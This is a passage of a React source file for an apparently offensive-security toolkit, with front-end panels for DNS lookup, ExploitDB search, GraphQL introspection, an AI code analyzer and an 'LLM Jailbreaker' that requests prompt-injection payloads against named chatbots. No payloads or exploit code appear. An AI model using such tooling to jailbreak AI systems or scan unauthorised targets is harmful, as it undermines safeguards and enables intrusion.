               <div key={i} className="text-neon-green mb-2 text-sm flex items-center justify-between">
                  <div>&rsaquo; {p}</div>
                  <CopyButton text={p} />
               </div>
            ))}
          </div>
        </div>
      </div>
    </CustomToolLayout>
  );
}


export function DnsTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: target, setValue: setTarget, handleKeyDown, saveToHistory } = useInputHistory('example.com');
  const [server, setServer] = useState('default');
  const [reverse, setReverse] = useState(false);
  const [loading, setLoading] = useState(false);
  const [output, setOutput] = useState('');

  const servers = [
    { label: 'System Default', ip: 'default' },
    { label: 'Google (8.8.8.8)', ip: '8.8.8.8' },
    { label: 'Cloudflare (1.1.1.1)', ip: '1.1.1.1' },
    { label: 'Quad9 (9.9.9.9)', ip: '9.9.9.9' },
    { label: 'OpenDNS (208.67.222.222)', ip: '208.67.222.222' }
  ];

  const fetchDns = async () => {
    if (!target) return;
    (document.activeElement as HTMLElement)?.blur();
    saveToHistory();
    setLoading(true);
    setOutput('');
    try {
      const qs = new URLSearchParams({ target, server, reverse: reverse.toString() }).toString();
      const backendUrl = getBackendUrl();
      const res = await fetch(`${backendUrl}/api/net/dns?${qs}`);
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || 'Request failed');
      setOutput(data.result);
    } catch (e: any) {
      setOutput(`Error: ${e.message}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-4 block">
        <div className="flex flex-col sm:flex-row gap-3">
          <ClearableInput
            autoCapitalize="none" autoCorrect="off" autoComplete="off" spellCheck={false}
            type="text"
            value={target}
            onChange={e => setTarget(e.target.value)}
            onKeyDown={handleKeyDown}
            className="bg-[#050505] border border-neon-green/20 focus-within:border-neon-green rounded-xl text-xs"
            placeholder="target domain or IP..."
           onClear={() => setTarget('')} />
          <button 
            onClick={fetchDns}
            disabled={loading || !target}
            className={`flex-1 sm:flex-initial px-6 py-4 rounded-xl text-xs font-bold transition-all whitespace-nowrap ${loading || !target ? 'bg-neon-green/5 text-neon-green/50 border border-neon-green/20 cursor-not-allowed' : 'bg-neon-green text-black hover:bg-neon-green hover:shadow-[0_0_15px_rgba(57,255,20,0.4)]'}`}
          >
            {loading ? 'QUERYING...' : 'RESOLVE'}
          </button>
        </div>

        <div className="flex flex-col sm:flex-row gap-3">
          <select 
            value={server}
            onChange={e => setServer(e.target.value)}
            className="flex-1 bg-[#050505] border border-neon-green/20 focus:border-neon-green rounded-xl p-3 text-neon-green font-mono text-xs outline-none transition-all appearance-none"
          >
            {servers.map(s => <option key={s.ip} value={s.ip}>{s.label}</option>)}
          </select>

          <button 
            onClick={() => setReverse(r => !r)}
            className={`px-4 py-3 border rounded-xl text-xs font-bold tracking-widest transition-all ${reverse ? 'bg-neon-green/10 border-neon-green text-neon-green' : 'border-neon-green/20 text-gray-400 hover:border-neon-green/50'}`}
          >
            REVERSE LOOKUP {reverse ? '(ON)' : '(OFF)'}
          </button>
        </div>

        <div className="bg-[#050505] border border-neon-green/20 rounded-xl p-4 min-h-[200px] overflow-auto relative mt-2">
          {output && (
            <button onClick={() => setOutput('')} className="absolute top-2 right-2 bg-black hover:bg-neon-green/10 border border-red-500/30 text-gray-400 hover:text-red-400 px-3 py-1.5 rounded text-[9px] font-bold uppercase tracking-widest transition-all">Clear</button>
          )}
          {output ? (
            <pre className="text-neon-green/80 text-[10px] sm:text-xs font-mono whitespace-pre-wrap mt-6">{output}</pre>
          ) : (
             <div className="text-gray-500 text-xs text-center mt-10">ENTER A TARGET TO VIEW DNS RECORDS.</div>
          )}
        </div>
      </div>
    </CustomToolLayout>
  );
}

import { 
  DirScannerTool, 
  SpiderTool, 
  ReactScannerTool, 
  WpScannerTool, 
  NetScannerTool, 
  WhoisTool 
} from './ScannerTools';

export function ExploitdbTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: keyword, setValue: setKeyword, handleKeyDown, saveToHistory } = useInputHistory('');
  const [data, setData] = useState<any[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const searchExamples = [
    "WordPress", "Log4j", "Windows", "Remote Code Execution", "SQL Injection", "Local Privilege Escalation", "Buffer Overflow"
  ];

  const searchExploits = async (q?: string) => {
    const term = q || keyword;
    if (!term) return;
    (document.activeElement as HTMLElement)?.blur();
    if (!q) saveToHistory();
    setLoading(true);
    setError('');
    setData([]);
    try {
      const backendUrl = getBackendUrl();
      const res = await fetch(`${backendUrl}/api/net/exploitdb/search?q=${encodeURIComponent(term)}`);
      if (!res.ok) throw new Error('Failed to fetch exploits');
      const json = await res.json();
      if (!json || !json.data) throw new Error('No exploits found');
      if (json.data.length === 0) setError('No exploits found.');
      setData(json.data);
    } catch(e: any) {
      setError(e.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="flex flex-col h-full space-y-4">
        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest block">
          EXPLOITDB SEARCH
        </label>

        <div className="flex flex-wrap gap-2 mb-2">
          {searchExamples.map(ex => (
            <button
              key={ex}
              onClick={() => { setKeyword(ex); searchExploits(ex); }}
              className="px-3 py-1 bg-neon-green/5 border border-neon-green/20 rounded text-[10px] text-neon-green/70 hover:bg-neon-green/10 hover:text-neon-green transition-all uppercase font-bold"
            >
              {ex}
            </button>
          ))}
        </div>

        <div className="flex flex-col sm:flex-row gap-3 p-1">
          <ClearableInput
            autoCapitalize="none" autoCorrect="off" autoComplete="off" spellCheck={false}
            type="text"
            value={keyword}
            onChange={e => setKeyword(e.target.value)}
            onKeyDown={handleKeyDown}
            className="bg-[#050505] border border-neon-green/20 focus-within:border-neon-green rounded-xl text-xs"
            placeholder="e.g. WordPress, CVE-2024-1234"
           onClear={() => setKeyword('')} />
          <button
            onClick={() => searchExploits()}
            disabled={loading || !keyword}
            className="bg-neon-green/10 text-neon-green border border-neon-green/30 hover:bg-neon-green hover:text-black transition-all px-6 py-4 rounded-xl font-bold uppercase tracking-widest text-xs disabled:opacity-50"
          >
            {loading ? 'SEARCHING...' : 'FIND'}
          </button>
        </div>

        {error && (
          <div className="p-4 border border-red-500/30 text-red-500 bg-red-500/10 rounded-xl text-xs">
            {error}
          </div>
        )}

        {data.length > 0 && (
          <div className="flex-1 overflow-auto bg-[#050505] p-4 rounded-xl border border-neon-green/20 scrollbar-thin scrollbar-thumb-neon-green/20">
            <h3 className="text-xs font-bold text-gray-500 tracking-widest uppercase mb-4">Results ({data.length})</h3>
            <div className="space-y-4">
              {data.map((exp, i) => (
                <div key={i} className="border-b border-neon-green/10 pb-4 last:border-0 p-2 rounded transition-all">
                   <div className="flex items-center justify-between mb-1 gap-2">
                      <span className="text-neon-green font-bold text-xs">{exp.description}</span>
                      <a href={exp.url} target="_blank" rel="noopener noreferrer" className="text-xs bg-neon-green/20 text-neon-green px-2 py-0.5 rounded border border-neon-green/30 hover:bg-neon-green hover:text-black transition-colors font-bold whitespace-nowrap">VIEW EDB-{exp.id}</a>
                   </div>
                   <div className="flex flex-wrap gap-4 mt-2">
                     <p className="text-gray-400 text-[10px]">Type: {exp.type}</p>
                     <p className="text-gray-400 text-[10px]">Platform: {exp.platform}</p>
                     <p className="text-gray-400 text-[10px]">Author: {exp.author}</p>
                   </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>
    </CustomToolLayout>
  );
}

export function GraphqlTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: url, setValue: setUrl, handleKeyDown, saveToHistory } = useInputHistory('');
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<string>('');

  const scan = async () => {
    if(!url) return;
    setLoading(true);
    setResult('Testing common GraphQL paths (/graphql, /api/graphql, /v1/graphql)...');
    try {
      const baseUrl = getBackendUrl();
      const res = await fetch(`${baseUrl}/api/net/graphql_scan`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target: url })
      });
      const data = await res.json();
      if (res.ok) {
        setResult(data.result || 'No response data.');
      } else {
        setResult(`Error: ${data.error || 'Failed to perform GraphQL introspection.'}`);
      }
    } catch (e: any) {
      setResult(`Connection Error: ${e.message}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="flex flex-col h-full space-y-4">
        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest block">GRAPHQL INSPECTOR</label>
        <div className="flex flex-col sm:flex-row gap-3">
          <ClearableInput
            autoCapitalize="none" autoCorrect="off" autoComplete="off" spellCheck={false}
            type="text"
            value={url}
            onChange={e => setUrl(e.target.value)}
            onKeyDown={handleKeyDown}
            className="bg-[#050505] border border-neon-green/20 focus-within:border-neon-green rounded-xl text-xs"
            placeholder="target url (e.g. https://api.example.com)"
            onClear={() => setUrl('')} 
          />
          <button
            onClick={scan}
            disabled={loading || !url}
            className="bg-neon-green/10 text-neon-green border border-neon-green/30 hover:bg-neon-green hover:text-black transition-all px-6 py-4 rounded-xl font-bold uppercase tracking-widest text-xs disabled:opacity-50"
          >
            {loading ? 'SCANNING...' : 'INTROSPECT'}
          </button>
        </div>

        <div className="flex-1 border border-neon-green/20 bg-[#050505] rounded-xl p-4 overflow-auto scrollbar-thin scrollbar-thumb-neon-green/20">
          <pre className="text-xs font-mono text-neon-green/80 whitespace-pre-wrap">
            {result || 'Waiting for target URL...'}
          </pre>
        </div>
      </div>
    </CustomToolLayout>
  );
}

export function AiTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: code, setValue: setCode, handleKeyDown, saveToHistory } = useInputHistory('');
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<string>('');

  const analyze = async () => {
    if(!code) return;
    setLoading(true);
    setResult('Contacting AI Core for analysis...');
    try {
      const baseUrl = getBackendUrl();
      const res = await fetch(`${baseUrl}/api/net/ai_analyze`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code })
      });
      const data = await res.json();
      if (res.ok) {
        setResult(data.result || 'No output generated.');
      } else {
        setResult(`Vulnerability Analysis Error: ${data.error || 'Check API configurations on the server.'}`);
      }
    } catch(e: any) {
      setResult(`Connection Error: ${e.message}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="flex flex-col h-full space-y-4">
        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest block">AI VULNERABILITY ANALYZER</label>

        <textarea
            value={code}
            onChange={e => setCode(e.target.value)}
            onKeyDown={handleKeyDown}
            onBlur={() => saveToHistory()}
            className="h-48 bg-[#050505] border border-neon-green/20 focus:border-neon-green rounded-xl p-4 text-neon-green font-mono text-xs outline-none transition-all resize-none"
            placeholder="Paste code snippet, minified JS, or HTTP request to analyze..."
          />

        <button
            onClick={analyze}
            disabled={loading || !code}
            className="w-full bg-neon-green text-black hover:bg-white hover:shadow-[0_0_15px_rgba(255,255,255,0.4)] transition-all px-6 py-4 rounded-xl font-bold uppercase tracking-widest text-xs disabled:opacity-50"
          >
            {loading ? 'ANALYZING NEURAL NET...' : 'ANALYZE SNIPPET'}
          </button>

        <div className="border border-neon-green/20 bg-[#050505] rounded-xl p-4 overflow-auto min-h-[150px] scrollbar-thin scrollbar-thumb-neon-green/20">
          <pre className="text-xs font-mono text-neon-green whitespace-pre-wrap drop-shadow-[0_0_2px_rgba(57,255,20,0.5)]">
            {result || 'Waiting for code snippet...'}
          </pre>
        </div>
      </div>
    </CustomToolLayout>
  );
}

export function LlmJailbreakerTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: target, setValue: setTarget, handleKeyDown, saveToHistory } = useInputHistory('');
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<string>('');

  const scan = async () => {
    if(!target) return;
    setLoading(true);
    setResult('Generating advanced context-aware prompt injection payload...');
    try {
      const baseUrl = getBackendUrl();
      const res = await fetch(`${baseUrl}/api/net/llm_jailbreak`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target: target })
      });
      const data = await res.json();
      if (res.ok) {
        setResult(data.result || 'No payload generated.');
      } else {
        setResult(`Error: ${data.error || 'Request failed.'}`);
      }
    } catch(e: any) {
      setResult(`Connection Error: ${e.message}`);
    } finally {
      setLoading(false);
    }
  };

  const tabs = ["ChatGPT", "Claude", "Gemini", "Copilot", "Customer Service Bot"];

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="flex flex-col h-full space-y-4">
        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest block">LLM JAILBREAKER</label>

        <div className="flex flex-wrap gap-2">
          {tabs.map(t => (
            <button
              key={t}
              onClick={() => setTarget(t)}
              className="bg-[#050505] border border-neon-green/20 hover:border-neon-green/80 text-neon-green/80 text-[10px] font-mono px-3 py-1 rounded transition-colors"
            >
              {t}
            </button>
          ))}
        </div>

        <div className="flex flex-col sm:flex-row gap-3">
          <ClearableInput
            autoCapitalize="none" autoCorrect="off" autoComplete="off" spellCheck={false}
            type="text"
            value={target}
            onChange={e => setTarget(e.target.value)}
            onKeyDown={handleKeyDown}
            className="bg-[#050505] border border-neon-green/20 focus-within:border-neon-green rounded-xl text-xs"
            placeholder="target LLM system or persona (e.g. Finance Bot)"
            onClear={() => setTarget('')}
          />
          <button
            onClick={scan}
            disabled={loading || !target}
            className="bg-neon-green/10 text-neon-green border border-neon-green/30 hover:bg-neon-green hover:text-black transition-all px-6 py-4 rounded-xl font-bold uppercase tracking-widest text-xs disabled:opacity-50 min-w-[200px]"
          >
            {loading ? 'GENERATING PAYLOAD...' : 'GENERATE PAYLOAD'}
          </button>
        </div>

        <div className="flex-1 border border-neon-green/20 bg-[#050505] rounded-xl p-4 overflow-auto scrollbar-thin scrollbar-thumb-neon-green/20">
          <div className="flex justify-between items-center mb-2">
             <span className="text-[10px] font-bold text-gray-500 uppercase tracking-widest">Injection Payload</span>
             {result && <CopyButton text={result} />}
          </div>
          <pre className="text-xs font-mono text-neon-green/80 whitespace-pre-wrap">
            {result || 'Waiting for target to generate payload...'}
          </pre>
        </div>
      </div>
    </CustomToolLayout>
  );
}

export function CustomToolRouter({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  switch (tool.id) {
    case 'qr_gen': return <QrGenTool tool={tool} onClose={onClose} />;
    case 'otp': return <OtpDecoderTool tool={tool} onClose={onClose} />;
    case 'passwords': return <PasswordsTool tool={tool} onClose={onClose} />;
    case 'speed': return <SpeedTestTool tool={tool} onClose={onClose} />;
    case 'cipher': return <CipherTool tool={tool} onClose={onClose} />;
    case 'security': return <SecurityCheckTool tool={tool} onClose={onClose} />;
    case 'notes': return <NotesTool tool={tool} onClose={onClose} />;
    case 'ip_calc': return <IpCalcTool tool={tool} onClose={onClose} />;
    case 'hackbar': return <HackbarTool tool={tool} onClose={onClose} />;
    case 'device': return <DeviceInfoTool tool={tool} onClose={onClose} />;
    case 'nfc': return <NfcTool tool={tool} onClose={onClose} />;
    case 'bluetooth': return <BluetoothTool tool={tool} onClose={onClose} />;
    case 'cve': return <CveTool tool={tool} onClose={onClose} />;
    case 'exploitdb': return <ExploitdbTool tool={tool} onClose={onClose} />;
    case 'phone_crawl': return <PhoneCrawlTool tool={tool} onClose={onClose} />;
    case 'dns': return <DnsTool tool={tool} onClose={onClose} />;
    case 'dir_scan': return <DirScannerTool tool={tool} onClose={onClose} />;
    case 'spider': return <SpiderTool tool={tool} onClose={onClose} />;
    case 'react_scan': return <ReactScannerTool tool={tool} onClose={onClose} />;
    case 'wp_scan': return <WpScannerTool tool={tool} onClose={onClose} />;
    case 'net_scan': return <NetScannerTool tool={tool} onClose={onClose} />;
    case 'whois': return <WhoisTool tool={tool} onClose={onClose} />;
    case 'graphql_scan': return <GraphqlTool tool={tool} onClose={onClose} />;
    case 'ai_assistant': return <AiTool tool={tool} onClose={onClose} />;
    case 'llm_jailbreak': return <LlmJailbreakerTool tool={tool} onClose={onClose} />;
    default: return null;
  }
}


